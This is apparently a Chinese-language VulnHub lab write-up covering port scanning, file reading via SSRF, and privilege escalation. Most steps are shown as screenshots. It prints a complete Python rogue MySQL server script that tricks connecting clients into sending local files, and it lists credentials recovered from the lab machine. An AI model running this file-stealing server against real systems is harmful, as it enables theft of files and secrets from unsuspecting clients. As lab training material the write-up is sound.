+++
ShowToc = true
TocOpen = true
title = '0x067 readme'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCE105e556d62df904228189b4475e208aeimage.png)

![](/vulnhub_img/WEBRESOURCEc464496b093cbef56ffdb913ef6a8bc3image.png)

![](/vulnhub_img/WEBRESOURCE4b9470766de50513b0d3745a11c3a4ddimage.png)

# 渗透

![](/vulnhub_img/WEBRESOURCEde8183202983a156ccc4f87730660b7aimage.png)

![](/vulnhub_img/WEBRESOURCEe7801f6d0dc2dcb2cdb8be32e8b89bb2image.png)

![](/vulnhub_img/WEBRESOURCE0ce94fd56d492a62392b93fcf3dab2d8image.png)

![](/vulnhub_img/WEBRESOURCE457f2266402615a06cc4fb01c8ec7e6aimage.png)

这里右键图片，可以发现目录：

![](/vulnhub_img/WEBRESOURCE87fff234d0dec2589a519b542f8246c6image.png)

![](/vulnhub_img/WEBRESOURCE777d642af0cb44f81143290792690ad5image.png)

![](/vulnhub_img/WEBRESOURCE619cf45715c94b62e287f46475a1c228image.png)

我感觉是在提示我们使用文件读取，但是该怎么进行文件读取呢：

SSRF是有本地文件读取的可能性的：

![](/vulnhub_img/WEBRESOURCEcd6af48624611705a08094423f4f067bimage.png)

[https://xz.aliyun.com/t/11225#toc-5](https://xz.aliyun.com/t/11225#toc-5)

用的这个脚本：

```
# -*- coding: utf-8 -*-
import socket
import os
import sys

#--------------------------------------------------------------------------------------------------------------------
port = int(sys.argv[1])
#--------------------------------------------------------------------------------------------------------------------

def mysql_get_file_content(sv, filename):
    conn, address = sv.accept()
    logpath = os.path.abspath('.') + "/log/" + address[0]
    if not os.path.exists(logpath):
        os.makedirs(logpath)
    # Conn from address)
    conn.sendall(
        "\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
    conn.recv(9999)
    # auth okay
    conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    conn.recv(9999)
    # want file...
    wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
    conn.sendall(wantfile)
    content = conn.recv(9999)
    conn.close()

    if len(content) > 4:
        with open(logpath + "/" + filename.replace("/", "_").replace(":", "_"), "w") as txt:
            txt.write(content)
        return True
    else:
        return False



# 开始监听
sv = socket.socket()
sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sv.bind(("", port))
sv.listen(5)
print "Listen Begin in port "+str(port)

# 日志文件夹




# 循环监听
while True:
    filename = raw_input("请输入接下来你想读的文件名 (直接按回车退出): ")
    if filename == "":
        break
    res = mysql_get_file_content(sv, filename)
    if res:
        print "Read Success! ---> "+filename
    else:
        print "Not Found~ ---> "+filename
```

![](/vulnhub_img/WEBRESOURCEfea96fe14cdbce21b2b238751779ddbbimage.png)

![](/vulnhub_img/WEBRESOURCE634ea01e5bc19e5e1e193b40c4c8e121image.png)

在当前目录会生成一个文件：

VU: julian

P: I_mean...WhoThoughtLettingTheMySQLClientTransmitFilesWasAGoodIdea?Sheesh

![](/vulnhub_img/WEBRESOURCE654438541a35043e400f28215b28fe99image.png)

这就是账号密码：

![](/vulnhub_img/WEBRESOURCEc83575ead2b7abfdca457aa1dbaf6b1dimage.png)

# 提权

这里有两个文件，明显是不属于这里的：

![](/vulnhub_img/WEBRESOURCE1d9abfd922dc9fa444decdbb88225f37image.png)

然后这里要逆向，把这串二进制字符串逆向出来，代码要求能力挺高的，暂且解决不了，密码如下：

So...YouFiguredOutHowToRecoverThisHuh?GGWPnoRE

![](/vulnhub_img/WEBRESOURCE688bbb58ef0d256b857c69d8f6cd6bbdimage.png)